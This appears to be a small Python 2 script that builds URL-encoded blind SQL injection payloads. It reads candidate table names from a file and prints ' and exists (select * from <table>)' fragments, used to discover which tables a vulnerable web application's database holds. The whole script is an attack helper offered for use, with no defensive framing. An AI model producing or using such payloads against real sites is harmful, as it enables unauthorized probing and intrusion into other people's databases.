from string import join,strip
def get_tablename():
    tablefile = open('table.txt')
    for line in tablefile.readlines():
        line = strip(line)

        sql = join(['%20and%20exists%20(select%20*%20from%20',line,')'],'')
        print sql
    
get_tablename()


import urllib

print urllib.unquote('%20and%20exists%20(select%20*%20from%20')
